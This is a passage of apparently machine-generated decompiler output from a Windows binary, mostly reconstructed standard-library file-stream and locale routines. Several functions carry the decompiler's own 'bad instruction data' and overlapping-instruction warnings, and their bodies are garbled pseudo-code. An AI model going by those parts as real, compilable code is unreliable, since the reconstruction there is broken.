  uVar1 = FUN_10028cf0(param_1);
  FUN_10012d30(uVar1);
  return;
}



/* Function: FUN_100285a0 */

ios_base * __thiscall FUN_100285a0(ios_base *param_1,byte param_2)

{
  ios_base *piVar1;
  
  piVar1 = param_1 + -0x60;
  *(undefined ***)(param_1 + *(int *)(*(int *)piVar1 + 4) + -0x60) = &PTR_DAT_10086df0;
  *(int *)(param_1 + *(int *)(*(int *)(param_1 + -0x60) + 4) + -100) =
       *(int *)(*(int *)(param_1 + -0x60) + 4) + -0x60;
  FUN_10027ce0();
  *(undefined ***)(param_1 + *(int *)(*(int *)(param_1 + -0x60) + 4) + -0x60) =
       std::basic_ostream<wchar_t,struct_std::char_traits<wchar_t>_>::vftable;
  *(int *)(param_1 + *(int *)(*(int *)(param_1 + -0x60) + 4) + -100) =
       *(int *)(*(int *)(param_1 + -0x60) + 4) + -8;
  *(undefined ***)param_1 = std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor(param_1);
  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(piVar1);
  }
  return piVar1;
}



/* Function: FUN_10028610 */

undefined4 __thiscall FUN_10028610(undefined4 param_1,byte param_2)

{
  FUN_10027ce0();
  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(param_1);
  }
  return param_1;
}



/* Function: FUN_10028640 */

undefined4 * __fastcall FUN_10028640(undefined4 *param_1)

{
  FUN_10028b80();
  *param_1 = std::basic_filebuf<wchar_t,struct_std::char_traits<wchar_t>_>::vftable;
  param_1[3] = param_1 + 1;
  *(undefined1 *)(param_1 + 0x13) = 0;
  param_1[7] = param_1 + 5;
  param_1[8] = param_1 + 6;
  param_1[0xb] = param_1 + 9;
  param_1[0xc] = param_1 + 10;
  *(undefined1 *)((int)param_1 + 0x46) = 0;
  param_1[4] = param_1 + 2;
  param_1[2] = 0;
  *(undefined4 *)param_1[8] = 0;
  *(undefined4 *)param_1[0xc] = 0;
  *(undefined4 *)param_1[3] = 0;
  *(undefined4 *)param_1[7] = 0;
  *(undefined4 *)param_1[0xb] = 0;
  param_1[0x12] = DAT_1009b5ac;
  param_1[0x14] = 0;
  param_1[0x10] = 0;
  return param_1;
}



/* Function: FUN_100286d0 */

int __thiscall FUN_100286d0(int param_1,int *param_2)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 *puVar3;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074b18;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  if (*(int *)(param_1 + 0x50) == 0) {
    iVar1 = FUN_10057338(param_2,0x22,0x40,DAT_100956e0 ^ (uint)&stack0xfffffffc);
    if (iVar1 != 0) {
      FUN_10028840(iVar1,1);
      uVar2 = FUN_10013020(&param_2);
      local_8 = 0;
      uVar2 = FUN_10028cf0(uVar2);
      FUN_10012d30(uVar2);
      local_8 = 0xffffffff;
      if (param_2 != (int *)0x0) {
        puVar3 = (undefined4 *)(**(code **)(*param_2 + 8))();
        if (puVar3 != (undefined4 *)0x0) {
          (**(code **)*puVar3)(1);
        }
      }
      ExceptionList = local_10;
      return param_1;
    }
  }
  ExceptionList = local_10;
  return 0;
}



/* Function: FUN_10028790 */

int __fastcall FUN_10028790(int param_1)

{
  undefined4 uVar1;
  char cVar2;
  int iVar3;
  int iVar4;
  
  if (*(int *)(param_1 + 0x50) == 0) {
    iVar4 = 0;
  }
  else {
    cVar2 = FUN_100288d0();
    iVar4 = param_1;
    if (cVar2 == '\0') {
      iVar4 = 0;
    }
    iVar3 = _fclose(*(FILE **)(param_1 + 0x50));
    if (iVar3 != 0) {
      iVar4 = 0;
    }
  }
  *(undefined1 *)(param_1 + 0x4c) = 0;
  *(int *)(param_1 + 0xc) = param_1 + 4;
  *(undefined4 **)(param_1 + 0x10) = (undefined4 *)(param_1 + 8);
  *(int *)(param_1 + 0x1c) = param_1 + 0x14;
  *(int *)(param_1 + 0x20) = param_1 + 0x18;
  *(int *)(param_1 + 0x2c) = param_1 + 0x24;
  *(int *)(param_1 + 0x30) = param_1 + 0x28;
  *(undefined1 *)(param_1 + 0x46) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  **(undefined4 **)(param_1 + 0x20) = 0;
  **(undefined4 **)(param_1 + 0x30) = 0;
  **(undefined4 **)(param_1 + 0xc) = 0;
  **(undefined4 **)(param_1 + 0x1c) = 0;
  **(undefined4 **)(param_1 + 0x2c) = 0;
  uVar1 = DAT_1009b5ac;
  *(undefined4 *)(param_1 + 0x50) = 0;
  *(undefined4 *)(param_1 + 0x48) = uVar1;
  *(undefined4 *)(param_1 + 0x40) = 0;
  return iVar4;
}



/* Function: FUN_10028840 */

void __thiscall FUN_10028840(int param_1,undefined4 param_2,int param_3)

{
  *(undefined1 *)(param_1 + 0x46) = 0;
  *(undefined4 **)(param_1 + 0x10) = (undefined4 *)(param_1 + 8);
  *(bool *)(param_1 + 0x4c) = param_3 == 1;
  *(int *)(param_1 + 0xc) = param_1 + 4;
  *(int *)(param_1 + 0x1c) = param_1 + 0x14;
  *(int *)(param_1 + 0x20) = param_1 + 0x18;
  *(int *)(param_1 + 0x2c) = param_1 + 0x24;
  *(int *)(param_1 + 0x30) = param_1 + 0x28;
  *(undefined4 *)(param_1 + 8) = 0;
  **(undefined4 **)(param_1 + 0x20) = 0;
  **(undefined4 **)(param_1 + 0x30) = 0;
  **(undefined4 **)(param_1 + 0xc) = 0;
  **(undefined4 **)(param_1 + 0x1c) = 0;
  **(undefined4 **)(param_1 + 0x2c) = 0;
  *(undefined4 *)(param_1 + 0x50) = param_2;
  *(undefined4 *)(param_1 + 0x48) = DAT_1009b5ac;
  *(undefined4 *)(param_1 + 0x40) = 0;
  return;
}



/* Function: FUN_100288d0 */

/* WARNING: Removing unreachable block (ram,0x10028961) */

void __fastcall FUN_100288d0(int *param_1)

{
  short sVar1;
  int iVar2;
  undefined8 *puVar3;
  int iVar4;
  undefined8 *puVar5;
  undefined1 auStack_3c [4];
  int iStack_38;
  undefined8 uStack_34;
  undefined1 uStack_2c;
  int iStack_24;
  uint uStack_20;
  uint local_1c;
  void *local_14;
  undefined1 *puStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0xffffffff;
  puStack_10 = &LAB_10074b48;
  local_14 = ExceptionList;
  local_1c = DAT_100956e0 ^ (uint)auStack_3c;
  ExceptionList = &local_14;
  if (((param_1[0x10] != 0) && (*(char *)((int)param_1 + 0x46) != '\0')) &&
     (sVar1 = (**(code **)(*param_1 + 0xc))(0xffff,DAT_100956e0 ^ (uint)&stack0xffffffb8),
     sVar1 != -1)) {
    uStack_20 = 0xf;
    uStack_34 = 0;
    iStack_24 = 8;
    uStack_2c = 0;
    uStack_c = 0;
LAB_10028972:
    puVar3 = &uStack_34;
    if (0xf < uStack_20) {
      puVar3 = (undefined8 *)uStack_34;
    }
    puVar5 = &uStack_34;
    if (0xf < uStack_20) {
      puVar5 = (undefined8 *)uStack_34;
    }
    iVar2 = (**(code **)(*(int *)param_1[0x10] + 0x20))
                      (param_1 + 0x12,puVar5,iStack_24 + (int)puVar3,&iStack_38);
    if (iVar2 == 0) {
      *(undefined1 *)((int)param_1 + 0x46) = 0;
    }
    else if (iVar2 != 1) goto LAB_10028a0f;
    puVar3 = &uStack_34;
    if (0xf < uStack_20) {
      puVar3 = (undefined8 *)uStack_34;
    }
    iVar2 = iStack_38 - (int)puVar3;
    if (iVar2 != 0) {
      puVar3 = &uStack_34;
      if (0xf < uStack_20) {
        puVar3 = (undefined8 *)uStack_34;
      }
      iVar4 = FUN_10059d85(puVar3,1,iVar2,param_1[0x14]);
      if (iVar2 != iVar4) goto LAB_10028a0f;
    }
    if (*(char *)((int)param_1 + 0x46) == '\0') goto LAB_10028a0f;
    if (iVar2 == 0) {
      FUN_10012870(8,0);
    }
    goto LAB_10028972;
  }
LAB_10028a28:
  ExceptionList = local_14;
  FUN_100579df();
  return;
LAB_10028a0f:
  if (0xf < uStack_20) {
    thunk_FUN_100579ee((undefined8 *)uStack_34);
  }
  goto LAB_10028a28;
}



/* Function: Reset_back */

/* Library Function - Multiple Matches With Same Base Name
    private: void __thiscall std::basic_filebuf<unsigned short,struct std::char_traits<unsigned
   short> >::_Reset_back(void)
    private: void __thiscall std::basic_filebuf<wchar_t,struct std::char_traits<wchar_t>
   >::_Reset_back(void)
   
   Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release */

void __fastcall Reset_back(int param_1)

{
  int iVar1;
  int iVar2;
  
  if (**(int **)(param_1 + 0xc) == param_1 + 0x44) {
    iVar1 = *(int *)(param_1 + 0x38);
    iVar2 = *(int *)(param_1 + 0x3c);
    **(int **)(param_1 + 0xc) = iVar1;
    **(int **)(param_1 + 0x1c) = iVar1;
    **(int **)(param_1 + 0x2c) = iVar2 - iVar1 >> 1;
  }
  return;
}



/* Function: Set_back */

/* Library Function - Multiple Matches With Same Base Name
    private: void __thiscall std::basic_filebuf<unsigned short,struct std::char_traits<unsigned
   short> >::_Set_back(void)
    private: void __thiscall std::basic_filebuf<wchar_t,struct std::char_traits<wchar_t>
   >::_Set_back(void)
   
   Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release */

void __fastcall Set_back(int param_1)

{
  int iVar1;
  int iVar2;
  
  iVar1 = param_1 + 0x44;
  iVar2 = **(int **)(param_1 + 0xc);
  if (iVar2 != iVar1) {
    *(int *)(param_1 + 0x38) = iVar2;
    *(int *)(param_1 + 0x3c) = **(int **)(param_1 + 0x1c) + **(int **)(param_1 + 0x2c) * 2;
  }
  **(int **)(param_1 + 0xc) = iVar1;
  **(int **)(param_1 + 0x1c) = iVar1;
  **(int **)(param_1 + 0x2c) = (param_1 - iVar1) + 0x46 >> 1;
  return;
}



/* Function: FUN_10028ac0 */

void __thiscall FUN_10028ac0(int param_1,int *param_2)

{
  undefined2 uVar1;
  undefined4 uVar2;
  int *piVar3;
  undefined4 *puVar4;
  uint uVar5;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074508;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  FUN_10008ce0(DAT_100956e0 ^ (uint)&stack0xfffffffc);
  *(int **)(param_1 + 0x38) = param_2;
  *(undefined4 *)(param_1 + 0x3c) = 0;
  uVar2 = FUN_10008cc0(&param_2);
  local_8 = 0;
  piVar3 = (int *)FUN_100271e0(uVar2);
  local_8 = 0xffffffff;
  if (param_2 != (int *)0x0) {
    puVar4 = (undefined4 *)(**(code **)(*param_2 + 8))();
    if (puVar4 != (undefined4 *)0x0) {
      (**(code **)*puVar4)(1);
    }
  }
  uVar1 = (**(code **)(*piVar3 + 0x30))(0x20);
  *(undefined2 *)(param_1 + 0x40) = uVar1;
  if ((*(int *)(param_1 + 0x38) == 0) &&
     (uVar5 = *(uint *)(param_1 + 0xc) & 0x17 | 4, *(uint *)(param_1 + 0xc) = uVar5,
     (*(uint *)(param_1 + 0x10) & uVar5) != 0)) {
    FUN_10008c40();
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_10028b80 */

undefined4 * __fastcall FUN_10028b80(undefined4 *param_1)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  
  *param_1 = vftable;
  puVar1 = (undefined4 *)FUN_100582fa(4);
  if (puVar1 == (undefined4 *)0x0) {
    puVar1 = (undefined4 *)0x0;
  }
  else {
    uVar2 = FUN_10056cb5(1);
    *puVar1 = uVar2;
  }
  param_1[0xd] = puVar1;
  param_1[3] = param_1 + 1;
  param_1[4] = param_1 + 2;
  param_1[7] = param_1 + 5;
  param_1[8] = param_1 + 6;
  param_1[0xb] = param_1 + 9;
  param_1[0xc] = param_1 + 10;
  param_1[2] = 0;
  *(undefined4 *)param_1[8] = 0;
  *(undefined4 *)param_1[0xc] = 0;
  *(undefined4 *)param_1[3] = 0;
  *(undefined4 *)param_1[7] = 0;
  *(undefined4 *)param_1[0xb] = 0;
  return param_1;
}



/* Function: FUN_10028c10 */

int __thiscall FUN_10028c10(int *param_1,int *param_2)

{
  int iVar1;
  undefined4 *puVar2;
  int *piVar3;
  
  iVar1 = FUN_10010d00();
  if (iVar1 + (int)param_2 != 0) {
    puVar2 = (undefined4 *)FUN_1000e760(&param_2,0,iVar1 + (int)param_2);
    iVar1 = FUN_10007010(*puVar2);
    *param_1 = iVar1;
    if (param_2 != (int *)0x0) {
      LOCK();
      iVar1 = *param_2;
      *param_2 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(param_2);
      }
    }
    goto LAB_10028c8c;
  }
  piVar3 = (int *)*param_1;
  if (piVar3 == (int *)0x0) {
LAB_10028c88:
    piVar3 = (int *)0x0;
  }
  else {
    if (*piVar3 != 0) {
      LOCK();
      iVar1 = *piVar3;
      *piVar3 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar3);
      }
      goto LAB_10028c88;
    }
    piVar3[2] = 0;
    *(undefined1 *)(piVar3 + 3) = 0;
  }
  *param_1 = (int)piVar3;
LAB_10028c8c:
  if (*param_1 != 0) {
    return *param_1 + 0xc;
  }
  return 0;
}



/* Function: FUN_10028cb0 */

undefined4 * FUN_10028cb0(undefined4 *param_1,undefined4 *param_2)

{
  int iVar1;
  int *piVar2;
  undefined4 *puVar3;
  
  piVar2 = (int *)param_1[2];
  puVar3 = param_1;
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    puVar3 = (undefined4 *)*piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      puVar3 = (undefined4 *)FUN_100579ee(piVar2);
    }
  }
  if (param_1 + 2 != (undefined4 *)0x0) {
    piVar2 = (int *)*param_2;
    param_1[2] = piVar2;
    puVar3 = param_2;
    if (piVar2 != (int *)0x0) {
      LOCK();
      puVar3 = (undefined4 *)*piVar2;
      *piVar2 = *piVar2 + 1;
      UNLOCK();
    }
  }
  return puVar3;
}



/* Function: FUN_10028cf0 */

int * FUN_10028cf0(int *param_1)

{
  uint uVar1;
  int *piVar2;
  uint uVar3;
  int iVar4;
  int *piVar5;
  undefined1 local_28 [12];
  _Lockit local_1c [4];
  _Lockit local_18 [4];
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074558;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  std::_Lockit::_Lockit(local_1c,0);
  piVar2 = DAT_1009ad18;
  local_8 = 0;
  local_14 = DAT_1009ad18;
  if (DAT_100980b0 == 0) {
    std::_Lockit::_Lockit(local_18,0);
    if (DAT_100980b0 == 0) {
      DAT_10098090 = DAT_10098090 + 1;
      DAT_100980b0 = DAT_10098090;
    }
    std::_Lockit::~_Lockit(local_18);
  }
  uVar1 = DAT_100980b0;
  iVar4 = *param_1;
  if (DAT_100980b0 < *(uint *)(iVar4 + 0xc)) {
    piVar5 = *(int **)(*(int *)(iVar4 + 8) + DAT_100980b0 * 4);
    if (piVar5 != (int *)0x0) goto LAB_10028ded;
  }
  else {
    piVar5 = (int *)0x0;
  }
  if (*(char *)(iVar4 + 0x14) == '\0') {
LAB_10028d99:
    if (piVar5 != (int *)0x0) goto LAB_10028ded;
  }
  else {
    iVar4 = FUN_10056caf(uVar3);
    if (uVar1 < *(uint *)(iVar4 + 0xc)) {
      piVar5 = *(int **)(*(int *)(iVar4 + 8) + uVar1 * 4);
      goto LAB_10028d99;
    }
  }
  piVar5 = piVar2;
  if (piVar2 == (int *)0x0) {
    iVar4 = FUN_10023d10(&local_14,param_1);
    if (iVar4 == -1) {
      FUN_1005851c("bad cast");
      FUN_1005de1b(local_28,&DAT_10092fd0);
    }
    piVar5 = local_14;
    DAT_1009ad18 = local_14;
    (**(code **)(*local_14 + 4))();
    Facet_Register(piVar5);
  }
LAB_10028ded:
  std::_Lockit::~_Lockit(local_1c);
  ExceptionList = local_10;
  return piVar5;
}



/* Function: FUN_10028e11 */

void FUN_10028e11(void)

{
  FUN_10027020();
  return;
}



/* Function: FUN_10028e20 */

/* WARNING: Control flow encountered bad instruction data */

code * __thiscall FUN_10028e20(undefined4 *param_1,code *param_2)

{
  byte *pbVar1;
  byte bVar2;
  undefined4 uVar3;
  int iVar4;
  int extraout_ECX;
  undefined1 in_CF;
  undefined1 uVar5;
  undefined1 in_ZF;
  undefined1 uVar6;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  code *pcStack_14;
  code *pcStack_10;
  
  pcStack_10 = param_2;
  *param_1 = param_2;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  pcStack_14 = param_2;
  uStack_18 = 0x10028e48;
  uVar3 = FUN_1058b0d3();
  pcStack_14 = (code *)0x0;
  uStack_18 = 0;
  uStack_1c = 0x31;
  param_1[1] = uVar3;
  (*DAT_10079420)(param_2);
  bVar2 = FUN_1049d7e9();
  if (!(bool)in_CF && !(bool)in_ZF) {
    std::_Lockit::~_Lockit((_Lockit *)&uStack_1c);
    ExceptionList = pcStack_10;
    return param_2;
  }
  uVar5 = 0x7a < bVar2;
  uVar6 = bVar2 == 0x7b;
  if (!(bool)uVar6) {
    uVar3 = (*param_2)();
    param_1[3] = uVar3;
  }
  param_1[4] = 0;
  iVar4 = FUN_1045ce30();
  if ((bool)uVar5 || (bool)uVar6) {
    pbVar1 = (byte *)(extraout_ECX + -0x367aefb9);
    *pbVar1 = *pbVar1 | (byte)extraout_ECX;
    if ((*pbVar1 != 0) && (iVar4 != 0)) {
      pcStack_10 = (code *)0x10028e95;
      uVar3 = (*param_2)();
      *(undefined4 *)((int)param_1 + 0x13) = uVar3;
    }
    return (code *)((int)param_1 + -1);
  }
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: FUN_10028ea0 */

/* WARNING: Instruction at (ram,0x10028ef2) overlaps instruction at (ram,0x10028ef1)
    */

uint __fastcall FUN_10028ea0(int *param_1)

{
  int *piVar1;
  int iVar2;
  undefined4 uVar3;
  uint uVar4;
  int extraout_ECX;
  int extraout_ECX_00;
  int unaff_EBX;
  
  if ((param_1[5] != 0) && (param_1[4] != 0)) {
    FUN_1036e4d0(param_1[4],param_1[5]);
  }
  iVar2 = param_1[4];
  if (iVar2 == 0) {
    iVar2 = param_1[3];
  }
  uVar3 = FUN_100d6853(iVar2);
  piVar1 = (int *)(unaff_EBX + -0x3f7af3ba);
  *piVar1 = *piVar1 + -1;
  iVar2 = extraout_ECX;
  if ((*piVar1 != 0) && (iVar2 = param_1[1], iVar2 != 0)) {
    FUN_10498051(uVar3,iVar2,uVar3);
    iVar2 = extraout_ECX_00;
  }
  if (*param_1 != 0) {
    iVar2 = param_1[1];
  }
  uVar4 = FUN_105b7ce6(*param_1,iVar2);
  return uVar4 & 0xffffff5e;
}



/* Function: FUN_10028f00 */

undefined4 * __fastcall FUN_10028f00(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  uint uVar1;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_1007600e;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if ((DAT_1009b5b0 & 1) == 0) {
    DAT_1009b5b0 = DAT_1009b5b0 | 1;
    local_8 = 0;
    FUN_10028f80(param_1,param_2,param_3);
    FUN_10057b51(&LAB_10078840,uVar1,param_1);
  }
  ExceptionList = local_10;
  return &DAT_1009b5b4;
}



/* Function: FUN_10028f80 */

undefined4 * FUN_10028f80(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10076035;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  DAT_1009b5b4 = 0;
  DAT_1009b5b8 = 0;
  local_8 = 0;
  FUN_10041860(param_1,param_3,param_2);
  FUN_10041d80(&DAT_100874a0,&DAT_10083854,param_2);
  FUN_10041d80(&DAT_100874ac,&DAT_100874a8,param_2);
  FUN_10041d80(L"\n\n$e",&PTR_10083554,param_2);
  FUN_10041d80(L"%PRODUCTNAME",L"DealWithLanguage",param_2);
  ExceptionList = local_10;
  return &DAT_1009b5b4;
}



/* Function: FUN_10029030 */

void __thiscall FUN_10029030(int *param_1,undefined4 param_2,int param_3,int param_4)

{
  int iVar1;
  short *psVar2;
  int *piVar3;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  int *unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 *puVar4;
  int *piStack_94;
  undefined1 auStack_84 [4];
  undefined4 local_80;
  int *local_7c;
  undefined4 local_78;
  undefined4 local_74;
  uint local_c;
  
  local_c = DAT_100956e0 ^ (uint)auStack_84;
  piStack_94 = (int *)0x0;
  local_80 = param_2;
  local_78 = 0;
  local_74 = 0;
  local_7c = param_1;
  FUN_10029140(param_2,0,0);
  if (param_4 != 0) {
    puVar4 = (undefined4 *)(param_3 + 4);
    do {
      iVar1 = puVar4[1];
      if ((((iVar1 < 0) || (*param_1 <= iVar1)) ||
          (psVar2 = *(short **)(param_1[1] + iVar1 * 4), psVar2 == (short *)0x0)) || (*psVar2 == 0))
      {
        piStack_94 = (int *)FUN_1000ba60();
      }
      else {
        piStack_94 = (int *)FUN_1000bd10();
      }
      FUN_10029360(*puVar4,&piStack_94,&stack0xffffff78,puVar4[-1]);
      piVar3 = piStack_94;
      if (piStack_94 != (int *)0x0) {
        if (piStack_94 + 3 != (int *)0x0) {
          if (puVar4[-1] == 0) {
            FUN_104a1531(extraout_EDX,unaff_EDI);
          }
          else {
            FUN_1031b29f(extraout_ECX,unaff_EDI,*puVar4,piStack_94 + 3);
          }
        }
        LOCK();
        iVar1 = *piVar3;
        *piVar3 = iVar1 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          FUN_100579ee(piVar3);
        }
      }
      puVar4 = puVar4 + 3;
      param_4 = param_4 + -1;
      param_1 = unaff_ESI;
    } while (param_4 != 0);
  }
  FUN_10029230();
  FUN_100579df();
  return;
}



/* Function: FUN_10029140 */

/* WARNING: Instruction at (ram,0x10029200) overlaps instruction at (ram,0x100291fc)
    */
/* WARNING: Control flow encountered bad instruction data */

undefined8 * __thiscall
FUN_10029140(undefined8 *param_1,int param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5)

{
  undefined4 *puVar1;
  int iVar2;
  int iVar3;
  undefined4 uVar4;
  char extraout_CH;
  char *pcVar5;
  undefined1 in_CF;
  undefined1 in_ZF;
  undefined8 uVar6;
  
  *param_1 = 0;
  *(undefined4 *)(param_1 + 1) = 0x7fffffff;
  *(undefined4 *)((int)param_1 + 0xc) = 0x7fffffff;
  *(undefined4 *)(param_1 + 2) = 0;
  *(undefined4 *)((int)param_1 + 0x14) = 0;
  *(int *)(param_1 + 3) = param_2;
  *(undefined4 *)((int)param_1 + 0x1c) = 0;
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)((int)param_1 + 0x24) = 0;
  *(undefined4 *)(param_1 + 5) = 0;
  *(int *)((int)param_1 + 0x2c) = param_2;
  *(undefined4 *)(param_1 + 6) = 0;
  *(undefined4 *)((int)param_1 + 0x34) = 0;
  *(undefined4 *)(param_1 + 7) = 0;
  uVar6 = FUN_10690659(param_2);
  pcVar5 = (char *)((ulonglong)uVar6 >> 0x20);
  if ((bool)in_CF || (bool)in_ZF) {
    *pcVar5 = *pcVar5 + extraout_CH;
    *(int *)(param_1 + 6) = (int)uVar6;
    iVar3 = (*DAT_10079420)(param_2,0x31);
    *(int *)((int)param_1 + 0x34) = iVar3;
    if ((iVar3 != 0) && (iVar2 = *(int *)(param_1 + 6), iVar2 != 0)) {
      uVar4 = FUN_106691bf(iVar2,iVar2,iVar3);
      *(undefined4 *)(param_1 + 7) = uVar4;
    }
    puVar1 = (undefined4 *)((int)param_1 + 0x44);
    *(undefined4 *)(param_1 + 8) = param_3;
    *(undefined4 *)((int)param_1 + 0x3c) = 0;
    *puVar1 = 0;
    *(undefined4 *)(param_1 + 9) = 0;
    *(undefined4 *)((int)param_1 + 0x4c) = 0;
    *(undefined4 *)(param_1 + 10) = 0;
    *(undefined4 *)(param_1 + 0xb) = param_4;
    *(undefined4 *)((int)param_1 + 0x54) = 0;
    *(undefined4 *)((int)param_1 + 0x5c) = param_5;
    *(undefined4 *)((int)param_1 + 0x1c) = 0;
    *(undefined4 *)(param_1 + 4) = 0;
    *(undefined4 *)((int)param_1 + 0x24) = 0;
    *(undefined4 *)(param_1 + 5) = 0;
    *param_1 = 0;
    FUN_104311dc(*(undefined4 *)(param_1 + 3),param_1);
    func_0x10307b64();
    (*(code *)0x1873ff56)();
    *puVar1 = 0;
    *(undefined4 *)(param_1 + 9) = 0;
    *(undefined4 *)((int)param_1 + 0x4c) = 0;
    *(undefined4 *)(param_1 + 10) = 0;
    uVar4 = func_0x100e178b(puVar1);
    (*(code *)0x1873ff56)(uVar4);
    return param_1;
  }
  *(char *)(param_2 + -0x18) = (*(char *)(param_2 + -0x18) - (char)param_1) - in_CF;
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: FUN_10029230 */

/* WARNING: Control flow encountered bad instruction data */

void __fastcall FUN_10029230(int param_1,undefined4 param_2)

{
  undefined4 local_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  uint local_8;
  
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_18 = 0;
  uStack_14 = 0;
  uStack_10 = 0;
  uStack_c = 0;
  FUN_101ddf70(param_2,*(undefined4 *)(param_1 + 0x18),&local_18);
  FUN_1043c163(*(undefined4 *)(param_1 + 0x18));
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: FUN_10029360 */

void __thiscall
FUN_10029360(int *param_1,undefined4 param_2,int *param_3,undefined4 *param_4,int param_5)

{
  int *piVar1;
  undefined4 uVar2;
  int iVar3;
  int iVar4;
  int *piVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 *puVar9;
  undefined4 local_110;
  undefined4 uStack_10c;
  undefined4 uStack_108;
  undefined4 uStack_104;
  undefined4 local_100;
  undefined4 uStack_fc;
  undefined4 uStack_f8;
  undefined4 uStack_f4;
  undefined4 local_f0;
  undefined4 uStack_ec;
  undefined4 uStack_e8;
  undefined4 uStack_e4;
  undefined8 local_e0;
  undefined4 local_d8;
  undefined4 local_d4;
  undefined4 uStack_d0;
  undefined4 uStack_cc;
  undefined4 uStack_c8;
  undefined4 local_a8;
  int *local_a4;
  int local_a0;
  undefined4 local_9c;
  undefined4 local_98;
  int *local_94;
  undefined4 *local_90;
  undefined4 local_8c;
  undefined4 local_88;
  undefined4 local_84;
  int *local_80;
  undefined4 local_74;
  undefined4 uStack_70;
  undefined4 uStack_6c;
  undefined4 uStack_68;
  undefined4 local_64;
  undefined4 uStack_60;
  undefined4 uStack_5c;
  undefined4 uStack_58;
  undefined4 local_54;
  undefined4 uStack_50;
  undefined4 uStack_4c;
  undefined4 uStack_48;
  undefined8 local_44;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 uStack_34;
  undefined4 uStack_30;
  undefined4 uStack_2c;
  undefined4 local_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  uint local_8;
  
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_84 = param_2;
  local_80 = param_3;
  local_90 = param_4;
  local_94 = param_1;
  piVar1 = (int *)FUN_10010370(0x3e9,1);
  if (piVar1 == (int *)0x0) {
    piVar5 = (int *)0x0;
    iVar4 = 0;
  }
  else {
    iVar4 = piVar1[1];
    piVar5 = piVar1 + 3;
  }
  uVar6 = local_84;
  local_a4 = piVar1;
  uVar2 = FUN_10594d42(piVar1,param_1[6]);
  FUN_1000bca0(uVar2);
  iVar3 = param_1[6];
  local_18 = 0;
  uStack_14 = 0;
  uStack_10 = 0;
  uStack_c = 0;
  local_8c = 0;
  local_88 = 0;
  local_9c = 0;
  local_98 = 0;
  if (param_5 != 0) {
    local_a0 = iVar3;
    iVar3 = FUN_10152882(&stack0xfffffffc,iVar3,local_84,uVar6,piVar5,iVar4);
  }
  local_a0 = iVar3;
  if (iVar3 != 0) {
    puVar9 = &local_18;
    FUN_10250867(param_4);
    local_84 = *param_4;
    local_a8 = param_4[1];
    local_38 = local_18;
    uStack_34 = uStack_14;
    uStack_30 = uStack_10;
    uStack_2c = uStack_c;
    uVar6 = local_18;
    uVar2 = uStack_14;
    uVar7 = uStack_10;
    uVar8 = uStack_c;
    FUN_1036dad2(&local_38,-*param_1,-param_1[1],iVar3,puVar9);
    if (piVar1 == (int *)0x0) {
      iVar4 = 0;
      piVar5 = (int *)0x0;
    }
    else {
      iVar4 = piVar1[2];
      piVar5 = piVar1 + 3;
    }
    local_d4 = uVar6;
    uStack_d0 = uVar2;
    uStack_cc = uVar7;
    uStack_c8 = uVar8;
    iVar4 = FUN_104b6afe(iVar4,param_1[0xc],piVar5,iVar4,&local_8c);
    if (iVar4 != 0) {
      iVar4 = *local_80;
      if (iVar4 == 0) {
        uVar6 = 0;
        iVar4 = 0;
      }
      else {
        uVar6 = *(undefined4 *)(iVar4 + 8);
        iVar4 = iVar4 + 0xc;
      }
      iVar4 = FUN_100e9a8f(param_1,param_1[0xc],iVar4,uVar6,&local_9c);
      if (iVar4 != 0) {
        FUN_1005ff60(&local_110,0,0x3c);
        local_3c = local_d8;
        local_74 = local_110;
        uStack_70 = uStack_10c;
        uStack_6c = uStack_108;
